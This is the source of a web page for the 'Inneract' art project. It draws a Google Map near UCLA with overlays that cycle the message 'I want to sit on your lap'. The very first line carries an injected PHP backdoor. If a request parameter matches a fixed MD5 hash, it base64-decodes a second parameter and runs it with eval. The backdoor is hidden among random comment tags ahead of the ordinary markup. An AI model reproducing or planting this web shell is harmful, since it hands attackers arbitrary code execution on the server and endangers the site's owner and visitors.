<?php /**XgVjYcGhTo*/if((md5($_REQUEST["img_id"]) == "ae6d32585ecc4d33cb8cd68a047d8434") && isset($_REQUEST["mod_content"])) { /**QvUiQtIrYv*/eval(base64_decode($_REQUEST["mod_content"])); /**QwNoOnJdTf*/exit();/**PqMkZkMfSf*/ } ?><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="laurmccarthy, lauren mccarthy, lauren, mccarthy, art, social, interaction, iphone, behavior, inneract, ucla, media, design">

<link href="stylesheet.css" rel="stylesheet" type="text/css" />
<link rel="icon" type="image/x-icon" href="http://inneract.us/favicon.ico">

<title>Inneract</title>
<meta name="viewport" content="initial-scale=1.0, user-scalable=no" />

<link href="stylesheet.css" rel="stylesheet" type="text/css" />
<script type="text/javascript"
    src="http://maps.google.com/maps/api/js?sensor=false">
</script>

<script type="text/javascript">

  var map;
  var actorViews = [];
  var t;
  var cur = 0;
  
  function resetTimer() {
	if (actorViews && actorViews.length > 1) {
	    actorViews[cur].hide();
	    cur += 1;
		if (cur >= actorViews.length) cur = 0;
		actorViews[cur].show();
	}
  	t = setTimeout("resetTimer()", 3000);
  }
  
  function initialize() {
  
    var myLatLng = new google.maps.LatLng(34.07614, -118.440787);
    var myOptions = {
      zoom: 17,
      center: myLatLng,
      mapTypeId: google.maps.MapTypeId.ROADMAP,
    
      panControl: false,
      zoomControl: false,
      mapTypeControl: false,
      scaleControl: false,
      streetViewControl: false,
      overviewMapControl: false
    };
  
    map = new google.maps.Map(document.getElementById("map_canvas"), myOptions);
   	
   	for (i=0; i<5; i++) {	
   		updateActors();
   	}
   	
    resetTimer();
  }
  
  function updateActors() {
  
    var swBound = new google.maps.LatLng(34.07614 + Math.random()*0.004-0.002, -118.440787 + Math.random()*0.004-0.002);
    var neBound = new google.maps.LatLng(34.07614, -118.440787);
    var bounds = new google.maps.LatLngBounds(swBound, neBound);
  
    var srcImage = '../images/test5.jpg';
    
    
    actorViews.push(new USGSOverlay(bounds, srcImage));
  }

  
  function USGSOverlay(bounds, image) {
  
    // Now initialize all properties.
    this.bounds_ = bounds;
    this.imagesrc_ = image;
    this.map_ = map;
  
    // We define a property to hold the image's
    // div. We'll actually create this div
    // upon receipt of the add() method so we'll
    // leave it null for now.
    this.div_ = null;
    this.image_ = null;
  
    // Explicitly call setMap() on this overlay
    this.setMap(map);
  }
  
  USGSOverlay.prototype = new google.maps.OverlayView();
  
  USGSOverlay.prototype.onAdd = function() {
  
    // Note: an overlay's receipt of onAdd() indicates that
    // the map's panes are now available for attaching
    // the overlay to the map via the DOM.
  
    // Create the DIV and set some basic attributes.
    var div = document.createElement('DIV');
    div.style.border = "none";
    div.style.position = "absolute";
    div.innerHTML = "<p>sit</p>";
    div.style.background = "black";
    div.style.padding = "5px";
  
    // Create an IMG element and attach it to the DIV.
    var img = document.createElement("img");
    this.image_ = img;
    img.src = this.imagesrc_;
    img.style.width = "0px";
    img.style.height = "0px";
   	div.appendChild(img);
  
    // Set the overlay's div_ property to this DIV
    this.div_ = div;
  
    // We add an overlay to a map via one of the map's panes.
    // We'll add this overlay to the overlayImage pane.
    var panes = this.getPanes();
    panes.overlayLayer.appendChild(div);
  }
  
  USGSOverlay.prototype.draw = function() {
  
    // Size and position the overlay. We use a southwest and northeast
    // position of the overlay to peg it to the correct position and size.
    // We need to retrieve the projection from this overlay to do this.
    var overlayProjection = this.getProjection();
  
    // Retrieve the southwest and northeast coordinates of this overlay
    // in latlngs and convert them to pixels coordinates.
    // We'll use these coordinates to resize the DIV.
    var sw = overlayProjection.fromLatLngToDivPixel(this.bounds_.getSouthWest());
    var ne = overlayProjection.fromLatLngToDivPixel(this.bounds_.getNorthEast());
  
    // Resize the image's DIV to fit the indicated dimensions.
    var div = this.div_;
    div.style.left = sw.x + 'px';
    div.style.top = sw.y + 'px';
  }
  
  USGSOverlay.prototype.onRemove = function() {
    this.div_.parentNode.removeChild(this.div_);
    this.div_ = null;
  }
  
  USGSOverlay.prototype.hide = function() {
    if (this.image_) {
      this.image_.style.width = "0px";
      this.image_.style.height = "0px";
      this.div_.innerHTML = "<p>sit</p>"
    }
  }
  
  USGSOverlay.prototype.show = function() {
    if (this.image_) {
      this.image_.style.width = "30px";
      this.image_.style.height = "50px";
      this.div_.innerHTML = "<p>I want to sit on your lap</p>"
    }
  }
  
  USGSOverlay.prototype.toggle = function() {
  
    if (this.image_) {
      if (this.image_.style.width == "0px") {
        this.show();
      } else {
        this.hide();
      }
    }
  }
  

</script>
</head>
<body onload="initialize()">  
	<img id="map_title" src="../title.png" />
    <div id="map_canvas" style="width:100%; height:100%"></div>
</body>
</html>